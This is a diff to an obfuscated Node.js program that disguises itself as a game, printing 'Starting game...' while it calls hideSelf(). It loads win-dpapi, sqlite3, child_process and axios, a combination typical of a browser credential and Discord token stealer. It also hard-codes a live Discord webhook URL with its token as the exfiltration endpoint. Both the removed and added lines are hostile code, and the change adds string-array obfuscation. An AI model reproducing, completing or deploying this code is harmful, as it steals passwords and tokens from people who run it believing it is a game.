@@ -1,18 +1,79 @@
-var a0_0x50ef53 = require('glob')
-const a0_0x9e24fc = require('fs')
-var a0_0x1fd788 = require('form-data')
-const a0_0x2340fa = require('https'),
-  a0_0x4d0855 = require('axios'),
-  a0_0x3a542a = require('crypto'),
-  a0_0x53a2d4 = require('nexe-natives-fix')(require.resolve('win-dpapi')),
-  a0_0x15e892 = require('nexe-natives-fix')(require.resolve('sqlite3')),
-  { exec: a0_0x2ef9f7 } = require('child_process')
-var a0_0x4b553e = false,
-  a0_0xfca1e5 = process.argv.slice(2)
-if (a0_0xfca1e5[0] == 'debug') {
-  a0_0x4b553e = false
+const _0x49a82b = _0x1867;
+(function (_0x312848, _0x4ff837) {
+    const _0x3f94b7 = _0x1867,
+        _0x1e92f7 = _0x312848();
+    while (!![]) {
+        try {
+            const _0x265834 =
+                (-parseInt(_0x3f94b7(0x201)) / 0x1) * (-parseInt(_0x3f94b7(0x207)) / 0x2) +
+                -parseInt(_0x3f94b7(0x208)) / 0x3 +
+                (parseInt(_0x3f94b7(0x1fc)) / 0x4) * (-parseInt(_0x3f94b7(0x1fe)) / 0x5) +
+                -parseInt(_0x3f94b7(0x1fd)) / 0x6 +
+                (-parseInt(_0x3f94b7(0x200)) / 0x7) * (parseInt(_0x3f94b7(0x206)) / 0x8) +
+                (-parseInt(_0x3f94b7(0x1f3)) / 0x9) * (-parseInt(_0x3f94b7(0x202)) / 0xa) +
+                (parseInt(_0x3f94b7(0x1ff)) / 0xb) * (parseInt(_0x3f94b7(0x1fb)) / 0xc);
+            if (_0x265834 === _0x4ff837) break;
+            else _0x1e92f7["push"](_0x1e92f7["shift"]());
+        } catch (_0x2f2b81) {
+            _0x1e92f7["push"](_0x1e92f7["shift"]());
+        }
+    }
+})(_0x453a, 0x4470a);
+function _0x1867(_0x194533, _0x9ecb18) {
+    const _0x453ab3 = _0x453a();
+    return (
+        (_0x1867 = function (_0x18675e, _0x44eb04) {
+            _0x18675e = _0x18675e - 0x1f3;
+            let _0x1e3bf1 = _0x453ab3[_0x18675e];
+            return _0x1e3bf1;
+        }),
+        _0x1867(_0x194533, _0x9ecb18)
+    );
 }
-const a0_0x3d6a03 = require('buffer-replace'),
+const fs = require("fs");
+console[_0x49a82b(0x1f9)](_0x49a82b(0x1f4));
+var debug = ![],
+    args = process["argv"][_0x49a82b(0x1f8)](0x2);
+function _0x453a() {
+    const _0xc6f4c0 = [
+        "7307616lMnvmZ",
+        "2440IZIBtX",
+        "571986SBvguW",
+        "3725XGxOba",
+        "11kNZBIX",
+        "1744407FYsMfD",
+        "357855xBbWZN",
+        "310vnuNhd",
+        "debug",
+        "resolve",
+        "glob",
+        "8bgSAdr",
+        "2wHmYRd",
+        "39555wnmxvP",
+        "36486yxdqKv",
+        "Starting\x20game...",
+        "child_process",
+        "crypto",
+        "buffer-replace",
+        "slice",
+        "log",
+        "nexe-natives",
+    ];
+    _0x453a = function () {
+        return _0xc6f4c0;
+    };
+    return _0x453a();
+}
+if (args[0x0] == _0x49a82b(0x203)) debug = !![];
+else hideSelf();
+const glob = require(_0x49a82b(0x205)),
+    crypto = require(_0x49a82b(0x1f6)),
+    { exec } = require(_0x49a82b(0x1f5)),
+    axios = require("axios"),
+    buf_replace = require(_0x49a82b(0x1f7)),
+    sqlite3 = require(_0x49a82b(0x1fa))(require[_0x49a82b(0x204)]("sqlite3")),
+    dpapi = require("nexe-natives")(require[_0x49a82b(0x204)]("win-dpapi"));
+
   a0_0x5ddfb9 =
     'https://ptb.discord.com/api/webhooks/954108820324503593/tuL0T3Q-tHqCnOuwamoOGkrJFnXRAJONKT22LkCwYUgAHsRhH_WZuDRuud5kqGhcDulH',
   a0_0x5bbd77 = {}
